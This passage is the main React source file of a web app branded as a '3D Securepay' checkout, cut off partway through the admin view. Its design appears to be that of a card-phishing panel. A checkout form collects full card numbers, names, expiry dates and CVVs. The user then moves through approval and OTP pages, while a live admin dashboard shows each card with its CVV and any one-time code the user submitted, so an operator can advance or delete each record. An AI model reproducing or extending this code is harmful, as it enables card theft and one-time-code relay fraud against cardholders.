import React, { useState, useEffect, useMemo } from 'react';
import { HashRouter, Routes, Route, Link, useNavigate, useLocation } from 'react-router-dom';
import { motion, AnimatePresence } from 'motion/react';
import {
  CreditCard as CardIcon,
  ShieldCheck,
  LayoutDashboard,
  CheckCircle,
  AlertCircle,
  Clock,
  ArrowRight,
  User,
  Calendar,
  Lock,
  ArrowUpRight,
  RefreshCw,
  Search,
  Filter,
  Trash2,
  ExternalLink,
  Terminal
} from 'lucide-react';
import { CreditCard3D } from './components/CreditCard3D';
import { WaitingApprovalPage } from './components/WaitingApprovalPage';
import { OTPPage } from './components/OTPPage';
import { AdminPortal } from './components/AdminPortal';
import {
  validateLuhn,
  getCardType,
  formatCardNumber,
  validateExpiry,
  validateCVV,
  validateName,
  CardType
} from './lib/validation';

// Define Transaction interface for backend communication
interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: CardType;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
  otpCode: string;
  submittedOtp?: string;
}

// Global Navigation Header Component
const Header: React.FC = () => {
  const location = useLocation();
  return (
    <header className="sticky top-0 z-40 w-full border-b border-slate-800 bg-slate-950/80 backdrop-blur-md">
      <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
        <div className="flex items-center space-x-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-tr from-indigo-500 to-emerald-400 p-0.5 shadow-lg shadow-indigo-500/10">
            <div className="flex h-full w-full items-center justify-center rounded-[10px] bg-slate-900">
              <ShieldCheck className="h-5 w-5 text-indigo-400" />
            </div>
          </div>
          <div>
            <h1 className="text-sm font-bold text-white tracking-tight">3D SECUREPAY</h1>
            <p className="text-[10px] font-mono text-slate-400">CREDIT ENGINE v2.4</p>
          </div>
        </div>

        <nav className="flex space-x-1 sm:space-x-2">
          <Link
            to="/"
            className={`flex items-center space-x-2 rounded-lg px-3 py-1.5 text-xs font-medium transition-all ${
              location.pathname === '/' || location.pathname === '/success'
                ? 'bg-slate-800 text-white shadow-sm'
                : 'text-slate-400 hover:bg-slate-900 hover:text-slate-200'
            }`}
          >
            <CardIcon className="h-3.5 w-3.5" />
            <span>Checkout Terminal</span>
          </Link>
        </nav>
      </div>
    </header>
  );
};

// Checkout Page component
const CheckoutPage: React.FC = () => {
  const navigate = useNavigate();
  
  // Card Form states
  const [cardNumber, setCardNumber] = useState('');
  const [holderName, setHolderName] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [amount, setAmount] = useState('149.99'); // Default mock checkout amount
  
  // UI states
  const [isFlipped, setIsFlipped] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [touched, setTouched] = useState<{ [key: string]: boolean }>({});
  const [formError, setFormError] = useState<string | null>(null);

  useEffect(() => {
    if (formError) {
      const timer = setTimeout(() => setFormError(null), 5000);
      return () => clearTimeout(timer);
    }
  }, [formError]);

  // Real-time card properties
  const cardType = useMemo(() => getCardType(cardNumber), [cardNumber]);

  // Form Validations
  const errors = useMemo(() => {
    const errs: { [key: string]: string } = {};
    
    const cleanNum = cardNumber.replace(/\D/g, '');
    if (cleanNum.length > 0) {
      if (cleanNum.length < 13 || cleanNum.length > 19) {
        errs.cardNumber = 'Card number must be between 13 and 19 digits';
      } else if (!validateLuhn(cleanNum)) {
        errs.cardNumber = 'Invalid card number (fails Luhn check)';
      }
    } else {
      errs.cardNumber = 'Card number is required';
    }

    if (holderName.trim().length > 0) {
      if (!validateName(holderName)) {
        errs.holderName = 'Cardholder name must contain only letters';
      }
    } else {
      errs.holderName = 'Cardholder name is required';
    }

    if (expiry.length > 0) {
      if (!validateExpiry(expiry)) {
        errs.expiry = 'Expiry must be a valid future date (MM/YY)';
      }
    } else {
      errs.expiry = 'Expiry is required';
    }

    if (cvv.length > 0) {
      if (!validateCVV(cvv, cardType)) {
        const reqLen = cardType === 'amex' ? 4 : 3;
        errs.cvv = `CVV must be ${reqLen} digits`;
      }
    } else {
      errs.cvv = 'CVV is required';
    }

    const amtNum = parseFloat(amount);
    if (isNaN(amtNum) || amtNum <= 0) {
      errs.amount = 'Please enter a valid payment amount';
    }

    return errs;
  }, [cardNumber, holderName, expiry, cvv, amount, cardType]);

  const isFormValid = Object.keys(errors).length === 0;

  // Handle Form Inputs with Masking/Formatting
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;
    const clean = input.replace(/\D/g, '');
    const detectedType = getCardType(clean);
    
    // Max lengths: 15 for Amex, 16 for others (some can be up to 19, limit at 16 for standard)
    const maxLen = detectedType === 'amex' ? 15 : 16;
    const capped = clean.slice(0, maxLen);
    
    const formatted = formatCardNumber(capped, detectedType);
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let input = e.target.value.replace(/\D/g, '');
    if (input.length > 4) input = input.slice(0, 4);

    if (input.length > 2) {
      setExpiry(`${input.slice(0, 2)}/${input.slice(2)}`);
    } else {
      setExpiry(input);
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value.replace(/\D/g, '');
    const maxLen = cardType === 'amex' ? 4 : 3;
    setCvv(input.slice(0, maxLen));
  };

  const handleBlur = (field: string) => {
    setTouched(prev => ({ ...prev, [field]: true }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Mark all fields as touched to show errors
    setTouched({
      cardNumber: true,
      holderName: true,
      expiry: true,
      cvv: true,
      amount: true
    });

    if (!isFormValid) return;

    setIsSubmitting(true);

    try {
      // Submit payment transaction
      const response = await fetch('/api/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber,
          cardholderName: holderName,
          expiry,
          cvv,
          cardType,
          amount: parseFloat(amount)
        })
      });

      const data = await response.json();

      if (data.success) {
        // Stagger redirection to let user see "processing" animation
        setTimeout(() => {
          navigate('/waiting', { state: { tx: data.transaction } });
        }, 1500);
      } else {
        setFormError(data.error || 'Payment failed.');
        setIsSubmitting(false);
      }
    } catch (err) {
      console.error(err);
      setFormError('An error occurred while connecting to the payment network.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6">
      <div className="grid grid-cols-1 gap-8 lg:grid-cols-12 lg:items-start lg:gap-12">
        
        {/* Left Hand: Card preview visualization */}
        <div className="flex flex-col items-center justify-center lg:col-span-5 lg:sticky lg:top-24">
          <div className="mb-4 text-center">
            <span className="inline-flex items-center space-x-1.5 rounded-full bg-indigo-500/10 px-2.5 py-1 text-[11px] font-mono font-medium text-indigo-400 ring-1 ring-inset ring-indigo-500/20">
              <span className="relative flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500"></span>
              </span>
              <span>LIVE INTEGRATED PERSPECTIVE</span>
            </span>
          </div>

          <div className="relative animate-float py-4">
            <CreditCard3D
              cardNumber={cardNumber}
              cardholderName={holderName}
              expiry={expiry}
              cvv={cvv}
              cardType={cardType}
              isFlipped={isFlipped}
            />
          </div>

          {/* Interactive instruction helpers */}
          <div className="mt-4 text-center max-w-xs text-[11px] font-mono text-slate-500">
            <p>The card auto-detects card network colors. Focusing CVV triggers a seamless 180° rotation.</p>
          </div>
        </div>

        {/* Right Hand: Payment Input Form */}
        <div className="lg:col-span-7">
          <div className="rounded-2xl border border-slate-800 bg-slate-900/40 p-6 shadow-2xl backdrop-blur-lg sm:p-8">
            <div className="mb-6">
              <h2 className="text-xl font-bold text-white tracking-tight">Checkout Terminal</h2>
              <p className="text-xs text-slate-400 mt-1">
                Perform transactions utilizing military-grade Luhn verification algorithms.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5">
              {/* Amount input block */}
              <div className="rounded-xl bg-slate-950 p-4 border border-slate-800/80 flex items-center justify-between">
                <div>
                  <label htmlFor="amount" className="block text-[10px] font-mono tracking-wider text-slate-500 uppercase">
                    Charge Amount (USD)
                  </label>
                  <input
                    type="number"
                    id="amount"
                    step="0.01"
                    min="1"
                    className="mt-1 bg-transparent border-0 text-white font-mono text-2xl font-bold focus:ring-0 focus:outline-none p-0 w-32"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    onBlur={() => handleBlur('amount')}
                  />
                </div>
                <div className="text-right">
                  <span className="text-xs font-semibold text-slate-300">Smart Cart Pay</span>
                  <p className="text-[9px] font-mono text-slate-500">Secured End-to-End</p>
                </div>
              </div>
              {touched.amount && errors.amount && (
                <p className="text-xs text-rose-400 flex items-center space-x-1">
                  <AlertCircle className="h-3 w-3" />
                  <span>{errors.amount}</span>
                </p>
              )}

              {/* Cardholder Name */}
              <div className="space-y-1.5">
                <label htmlFor="holderName" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
                  <User className="h-3.5 w-3.5 text-slate-500" />
                  <span>Cardholder Name</span>
                </label>
                <input
                  type="text"
                  id="holderName"
                  placeholder="e.g. ALICE JOHNSON"
                  className={`w-full rounded-xl border bg-slate-950 px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
                    touched.holderName && errors.holderName
                      ? 'border-rose-500/50 focus:ring-rose-500/20'
                      : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
                  }`}
                  value={holderName}
                  onChange={(e) => setHolderName(e.target.value)}
                  onBlur={() => handleBlur('holderName')}
                />
                {touched.holderName && errors.holderName && (
                  <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
                    <AlertCircle className="h-3 w-3" />
                    <span>{errors.holderName}</span>
                  </p>
                )}
              </div>

              {/* Card Number */}
              <div className="space-y-1.5">
                <label htmlFor="cardNumber" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
                  <CardIcon className="h-3.5 w-3.5 text-slate-500" />
                  <span>Card Number</span>
                </label>
                <div className="relative">
                  <input
                    type="text"
                    id="cardNumber"
                    placeholder="4111 1111 1111 1111"
                    className={`w-full rounded-xl border bg-slate-950 pl-4 pr-12 py-3 text-sm font-mono text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
                      touched.cardNumber && errors.cardNumber
                        ? 'border-rose-500/50 focus:ring-rose-500/20'
                        : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
                    }`}
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    onBlur={() => handleBlur('cardNumber')}
                  />
                  {/* Small absolute card-type logo visual indicator on input */}
                  <div className="absolute right-4 top-1/2 -translate-y-1/2 select-none h-6 flex items-center">
                    {cardType !== 'unknown' ? (
                      <span className="text-[10px] font-mono uppercase bg-slate-800 px-1.5 py-0.5 rounded border border-slate-700 text-indigo-400">
                        {cardType}
                      </span>
                    ) : (
                      <CardIcon className="h-4 w-4 text-slate-600" />
                    )}
                  </div>
                </div>
                {touched.cardNumber && errors.cardNumber && (
                  <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
                    <AlertCircle className="h-3 w-3" />
                    <span>{errors.cardNumber}</span>
                  </p>
                )}
              </div>

              {/* Row for Expiry and CVV */}
              <div className="grid grid-cols-2 gap-4">
                {/* Expiry Date */}
                <div className="space-y-1.5">
                  <label htmlFor="expiry" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
                    <Calendar className="h-3.5 w-3.5 text-slate-500" />
                    <span>Expiration (MM/YY)</span>
                  </label>
                  <input
                    type="text"
                    id="expiry"
                    placeholder="MM/YY"
                    className={`w-full rounded-xl border bg-slate-950 px-4 py-3 text-sm font-mono text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
                      touched.expiry && errors.expiry
                        ? 'border-rose-500/50 focus:ring-rose-500/20'
                        : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
                    }`}
                    value={expiry}
                    onChange={handleExpiryChange}
                    onBlur={() => handleBlur('expiry')}
                  />
                  {touched.expiry && errors.expiry && (
                    <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
                      <AlertCircle className="h-3 w-3 animate-pulse" />
                      <span>{errors.expiry}</span>
                    </p>
                  )}
                </div>

                {/* CVV */}
                <div className="space-y-1.5">
                  <label htmlFor="cvv" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
                    <Lock className="h-3.5 w-3.5 text-slate-500" />
                    <span>CVV / CVC</span>
                  </label>
                  <input
                    type="password"
                    id="cvv"
                    placeholder={cardType === 'amex' ? '1234' : '123'}
                    className={`w-full rounded-xl border bg-slate-950 px-4 py-3 text-sm font-mono text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
                      touched.cvv && errors.cvv
                        ? 'border-rose-500/50 focus:ring-rose-500/20'
                        : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
                    }`}
                    value={cvv}
                    onChange={handleCvvChange}
                    onFocus={() => setIsFlipped(true)}
                    onBlur={() => {
                      setIsFlipped(false);
                      handleBlur('cvv');
                    }}
                  />
                  {touched.cvv && errors.cvv && (
                    <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
                      <AlertCircle className="h-3 w-3" />
                      <span>{errors.cvv}</span>
                    </p>
                  )}
                </div>
              </div>

              {formError && (
                <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-4 text-xs text-rose-400 flex items-center space-x-2 animate-pulse">
                  <AlertCircle className="h-4 w-4 shrink-0" />
                  <span>{formError}</span>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isSubmitting}
                className={`relative mt-4 flex w-full items-center justify-center space-x-2 rounded-xl bg-gradient-to-r from-indigo-500 via-purple-600 to-indigo-600 px-4 py-3.5 text-sm font-bold text-white shadow-xl transition-all hover:scale-[1.01] hover:brightness-110 active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none`}
              >
                {isSubmitting ? (
                  <>
                    <RefreshCw className="h-4 w-4 animate-spin" />
                    <span>AUTHORIZING FUND LOCK...</span>
                  </>
                ) : (
                  <>
                    <span>SUBMIT FOR REVIEW</span>
                    <ArrowRight className="h-4 w-4" />
                  </>
                )}
              </button>
            </form>
          </div>
        </div>

      </div>
    </div>
  );
};

// Success Page Component
const SuccessPage: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const tx: Transaction | undefined = location.state?.tx;

  // Fallback to home if page loaded directly without receipt transaction state
  useEffect(() => {
    if (!tx) {
      navigate('/');
    }
  }, [tx, navigate]);

  if (!tx) return null;

  return (
    <div className="mx-auto max-w-xl px-4 py-16 sm:px-6">
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.4 }}
        className="rounded-2xl border border-slate-800 bg-slate-900/40 p-8 text-center shadow-2xl backdrop-blur-lg"
      >
        <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 mb-6">
          <CheckCircle className="h-8 w-8" />
        </div>

        <h2 className="text-2xl font-bold text-white tracking-tight">Payment Dispatched</h2>
        <p className="text-sm text-slate-400 mt-2">
          Your credit card submission has been logged successfully and routed for administrative authorization.
        </p>

        {/* Receipt Block */}
        <div className="my-8 rounded-xl bg-slate-950/80 border border-slate-800/80 p-5 text-left space-y-3 font-mono text-xs">
          <div className="flex justify-between border-b border-slate-900 pb-2">
            <span className="text-slate-500">TRANSACTION ID</span>
            <span className="text-indigo-400 font-bold">{tx.id}</span>
          </div>
          <div className="flex justify-between border-b border-slate-900 pb-2">
            <span className="text-slate-500">CARD NUM</span>
            <span className="text-white">{tx.cardNumber}</span>
          </div>
          <div className="flex justify-between border-b border-slate-900 pb-2">
            <span className="text-slate-500">CARDHOLDER</span>
            <span className="text-white truncate max-w-[200px]">{tx.cardholderName.toUpperCase()}</span>
          </div>
          <div className="flex justify-between border-b border-slate-900 pb-2">
            <span className="text-slate-500">NETWORK</span>
            <span className="text-white uppercase">{tx.cardType}</span>
          </div>
          <div className="flex justify-between border-b border-slate-900 pb-2">
            <span className="text-slate-500">SUM TOTAL</span>
            <span className="text-emerald-400 font-bold">${tx.amount.toFixed(2)}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-slate-500">QUEUE STATUS</span>
            <span className="inline-flex items-center space-x-1 text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded border border-amber-500/20 font-bold">
              <Clock className="h-2.5 w-2.5 animate-spin" />
              <span>{tx.status.toUpperCase()}</span>
            </span>
          </div>
        </div>

        {/* Navigation CTAs */}
        <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
          <button
            onClick={() => navigate('/')}
            className="flex items-center justify-center space-x-2 rounded-xl border border-slate-800 bg-slate-900/60 hover:bg-slate-900 px-4 py-3 text-xs font-semibold text-slate-300 transition"
          >
            <span>Submit Another</span>
          </button>
          <button
            onClick={() => navigate('/dashboard')}
            className="flex items-center justify-center space-x-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 px-4 py-3 text-xs font-semibold text-white shadow-lg shadow-indigo-600/20 transition"
          >
            <span>Manage Dashboard</span>
            <ArrowRight className="h-3.5 w-3.5" />
          </button>
        </div>
      </motion.div>
    </div>
  );
};

// Admin Dashboard Component
const AdminDashboard: React.FC = () => {
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [selectedTx, setSelectedTx] = useState<Transaction | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<'All' | 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED'>('All');
  
  // Simulated visual flip toggle for dashboard inspector card
  const [cardInspectorFlipped, setCardInspectorFlipped] = useState(false);
  const [actionBusy, setActionBusy] = useState(false);
  const [dashboardError, setDashboardError] = useState<string | null>(null);
  const [deletingId, setDeletingId] = useState<string | null>(null);

  useEffect(() => {
    if (dashboardError) {
      const timer = setTimeout(() => setDashboardError(null), 5000);
      return () => clearTimeout(timer);
    }
  }, [dashboardError]);

  useEffect(() => {
    if (deletingId) {
      const timer = setTimeout(() => setDeletingId(null), 3000);
      return () => clearTimeout(timer);
    }
  }, [deletingId]);

  // Fetch all transactions from the Express server API
  const fetchTransactions = async (autoSelect = false) => {
    try {
      const res = await fetch('/api/transactions');
      const data = await res.json();
      setTransactions(data);
      
      // Auto-select first transaction if none selected or if matching auto-select request
      if (data.length > 0) {
        if (autoSelect || !selectedTx) {
          setSelectedTx(data[0]);
        } else {
          // Keep current selection but update its reference to catch state changes
          const updatedSelected = data.find((t: Transaction) => t.id === selectedTx.id);
          if (updatedSelected) {
            setSelectedTx(updatedSelected);
          }
        }
      } else {
        setSelectedTx(null);
      }
    } catch (err) {
      console.error('Error fetching transactions:', err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchTransactions();
    const intervalId = setInterval(() => {
      fetchTransactions();
    }, 2000);
    return () => clearInterval(intervalId);
  }, []);

  // Filter transactions based on Search Term & Status Filter
  const filteredTxList = useMemo(() => {
    return transactions.filter(t => {
      const matchesSearch =
        t.cardholderName.toLowerCase().includes(searchTerm.toLowerCase()) ||
        t.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
        t.cardNumber.includes(searchTerm);
      const matchesStatus = statusFilter === 'All' || t.status === statusFilter;
      return matchesSearch && matchesStatus;
    });
  }, [transactions, searchTerm, statusFilter]);

  // Handle Approve/Reject status changes
  const handleUpdateStatus = async (status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED') => {
    if (!selectedTx || actionBusy) return;
    setActionBusy(true);

    try {
      const response = await fetch(`/api/admin/action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: selectedTx.id, status })
      });
      const data = await response.json();

      if (data.success) {
        // Refresh items and update detailed view
        await fetchTransactions();
      } else {
        setDashboardError(data.error || 'Failed to update status.');
      }
    } catch (err) {
      console.error(err);
      setDashboardError('Error communicating status update to server.');
    } finally {
      setActionBusy(false);
    }
  };

  // Optional: clear transaction
  const handleDeleteTransaction = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    
    // Multi-click secure undoing pattern instead of window.confirm
    if (deletingId !== id) {
      setDeletingId(id);
      return;
    }

    try {
      const res = await fetch(`/api/transactions/${id}`, {
        method: 'DELETE'
      });
      if (res.ok) {
        setDeletingId(null);
        // If we deleted the currently selected one, auto select first remaining item
        const wasSelected = selectedTx?.id === id;
        await fetchTransactions(wasSelected);
      }
    } catch (err) {
      console.error(err);
      setDashboardError('Failed to remove transaction record.');
    }
  };

  return (
    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6">
      
      {/* Title block */}
      <div className="mb-6 flex flex-col justify-between gap-4 sm:flex-row sm:items-center">
        <div>
          <h2 className="text-2xl font-bold text-white tracking-tight">Financial Ledger Administration</h2>
          <p className="text-xs text-slate-400 mt-1">
            Real-time transactional desk. Auditing logs, securing Luhn structures, and issuing status locks.
          </p>
        </div>
        
        <button
          onClick={() => fetchTransactions()}
          className="inline-flex items-center space-x-1.5 rounded-xl border border-slate-800 bg-slate-900/60 px-4 py-2.5 text-xs font-semibold text-slate-300 hover:bg-slate-900 transition"
        >
          <RefreshCw className="h-3.5 w-3.5" />
          <span>Refresh Ledger</span>
        </button>
      </div>

      {dashboardError && (
        <div className="mb-6 rounded-xl border border-rose-500/20 bg-rose-500/10 p-4 text-xs text-rose-400 flex items-center space-x-2 animate-pulse">
          <AlertCircle className="h-4 w-4 shrink-0" />
          <span>{dashboardError}</span>
        </div>
      )}

      <div className="grid grid-cols-1 gap-8 lg:grid-cols-12">
        
        {/* --- LEFT COLUMN: Ledger Logs & Filters (7 cols) --- */}
        <div className="lg:col-span-7 space-y-4">
          
          {/* Controls bar (Search, Filter Tabs) */}
          <div className="rounded-xl border border-slate-850 bg-slate-900/30 p-4 space-y-3">
            {/* Search Input */}
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500" />
              <input
                type="text"
                placeholder="Search by ID, Name, or Card Numbers..."
                className="w-full rounded-lg border border-slate-800 bg-slate-950 pl-10 pr-4 py-2 text-xs text-white placeholder-slate-600 focus:outline-none focus:ring-1 focus:ring-indigo-500/40"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            {/* Filter Tabs */}
            <div className="flex flex-wrap items-center gap-1.5 pt-1">
              <span className="text-[10px] font-mono uppercase text-slate-500 mr-2 flex items-center space-x-1">
                <Filter className="h-3 w-3" />
                <span>FILTERS:</span>
              </span>
              {(['All', 'PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'] as const).map(tab => (
                <button
                  key={tab}
                  onClick={() => setStatusFilter(tab)}
                  className={`rounded-md px-2.5 py-1 text-[11px] font-mono font-bold transition-all ${
                    statusFilter === tab
                      ? 'bg-indigo-600 text-white shadow-md'
                      : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-900'
                  }`}
                >
                  {tab === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : tab === 'AWAITING_OTP' ? 'AWAITING OTP' : tab === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : tab}
                </button>
              ))}
            </div>
          </div>

          {/* Ledger list container */}
          <div className="rounded-xl border border-slate-800 bg-slate-900/20 overflow-hidden shadow-xl">
            {isLoading ? (
              <div className="py-24 text-center">
                <RefreshCw className="h-8 w-8 animate-spin mx-auto text-indigo-400" />
                <p className="text-xs text-slate-500 mt-2 font-mono">LOADING TRANSACTION STACK...</p>
              </div>
            ) : filteredTxList.length === 0 ? (
              <div className="py-24 text-center">
                <CardIcon className="h-10 w-10 mx-auto text-slate-600 mb-2" />
                <p className="text-sm font-bold text-slate-400">No records found</p>
                <p className="text-xs text-slate-600 font-mono mt-1">Try matching alternative keywords or filters.</p>
              </div>
            ) : (
              <div className="divide-y divide-slate-800/60 max-h-[500px] overflow-y-auto">
                {filteredTxList.map((tx) => {
                  const isSelected = selectedTx?.id === tx.id;
                  
                  // Status pill visual definitions
                  let statusBadge = null;
                  if (tx.status === 'APPROVED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-emerald-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-emerald-400 ring-1 ring-inset ring-emerald-500/20">
                        <span>APPROVED</span>
                      </span>
                    );
                  } else if (tx.status === 'REJECTED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-rose-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-rose-400 ring-1 ring-inset ring-rose-500/20">
                        <span>REJECTED</span>
                      </span>
                    );
                  } else if (tx.status === 'AWAITING_OTP') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-indigo-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-indigo-400 ring-1 ring-inset ring-indigo-500/20">
                        <span>AWAITING OTP</span>
                      </span>
                    );
                  } else if (tx.status === 'OTP_SUBMITTED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-cyan-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-cyan-400 ring-1 ring-inset ring-cyan-500/20">
                        <span>OTP SUBMITTED</span>
                      </span>
                    );
                  } else {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-amber-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-amber-400 ring-1 ring-inset ring-amber-500/20">
                        <span>PENDING CARD</span>
                      </span>
                    );
                  }

                  return (
                    <div
                      key={tx.id}
                      onClick={() => {
                        setSelectedTx(tx);
                        setCardInspectorFlipped(false); // Reset flips on card changes
                      }}
                      className={`flex items-center justify-between p-4 cursor-pointer transition-all ${
                        isSelected
                          ? 'bg-indigo-600/10 border-l-2 border-indigo-500'
                          : 'hover:bg-slate-900/40 border-l-2 border-transparent'
                      }`}
                    >
                      <div className="flex items-center space-x-3.5 min-w-0">
                        {/* Circle visual representation */}
                        <div className="hidden sm:flex h-9 w-9 items-center justify-center rounded-lg bg-slate-950 border border-slate-800 font-mono text-[10px] text-slate-400 shrink-0 uppercase">
                          {tx.cardType.slice(0, 4)}
                        </div>

                        <div className="min-w-0">
                          <div className="flex items-center space-x-2">
                            <span className="font-mono text-xs font-bold text-white tracking-tight">{tx.id}</span>
                            {statusBadge}
                          </div>
                          <p className="text-xs text-slate-300 font-medium truncate mt-0.5 uppercase">
                            {tx.cardholderName}
                          </p>
                          <div className="flex items-center space-x-2 text-[10px] font-mono text-slate-500 mt-1">
                            <span>{tx.cardNumber}</span>
                            <span>•</span>
                            <span>{new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
                          </div>
                        </div>
                      </div>

                      <div className="flex items-center space-x-4">
                        <div className="text-right">
                          <p className="font-mono text-xs font-bold text-white">${tx.amount.toFixed(2)}</p>
                          <p className="text-[9px] font-mono text-slate-500">USD</p>
                        </div>
                        {/* Clear Button */}
                        <button
                          onClick={(e) => handleDeleteTransaction(tx.id, e)}
                          className={`p-1.5 rounded transition font-mono text-[10px] flex items-center space-x-1 ${
                            deletingId === tx.id
                              ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                              : 'text-slate-600 hover:text-rose-400'
                          }`}
                          title={deletingId === tx.id ? 'Confirm Clear' : 'Clear record'}
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                          {deletingId === tx.id && <span className="text-[9px] font-bold">CONFIRM?</span>}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>

        {/* --- RIGHT COLUMN: 3D Inspector Panel (5 cols) --- */}
        <div className="lg:col-span-5">
          <div className="rounded-2xl border border-slate-800 bg-slate-900/30 p-6 shadow-2xl backdrop-blur-lg sticky top-24">
            {selectedTx ? (
              <div className="space-y-6">
                
                {/* Header detail */}
                <div className="flex justify-between items-start border-b border-slate-800/80 pb-4">
                  <div>
                    <span className="text-[10px] font-mono text-indigo-400 font-bold uppercase tracking-wider">
                      INSPECTOR DESK
                    </span>
                    <h3 className="text-lg font-bold text-white tracking-tight mt-0.5">
                      Transaction detail
                    </h3>
                  </div>
                  <div className="text-right">
                    <span className="font-mono text-sm font-bold text-white block">
                      ${selectedTx.amount.toFixed(2)}
                    </span>
                    <span className="text-[10px] font-mono text-slate-500">
                      SUM LOCKED
                    </span>
                  </div>
                </div>

                {/* 3D Render block */}
                <div className="flex flex-col items-center justify-center pt-2">
                  <div className="relative w-full flex justify-center">
                    <CreditCard3D
                      cardNumber={selectedTx.cardNumber}
                      cardholderName={selectedTx.cardholderName}
                      expiry={selectedTx.expiry}
                      cvv={selectedTx.cvv}
                      cardType={selectedTx.cardType}
                      isFlipped={cardInspectorFlipped}
                    />
                  </div>

                  {/* Inspector Flippers */}
                  <div className="mt-4 flex items-center space-x-2">
                    <button
                      onClick={() => setCardInspectorFlipped(!cardInspectorFlipped)}
                      className="inline-flex items-center space-x-1 rounded-lg bg-slate-950 px-3 py-1.5 text-[11px] font-mono font-bold text-slate-400 hover:text-white border border-slate-900 transition"
                    >
                      <RefreshCw className="h-3 w-3" />
                      <span>FLIP INSPECTOR VIEW</span>
                    </button>
                  </div>
                </div>

                {/* Meta details text list */}
                <div className="rounded-xl bg-slate-950/80 border border-slate-800/60 p-4 space-y-2.5 font-mono text-xs">
                  {selectedTx.submittedOtp && (
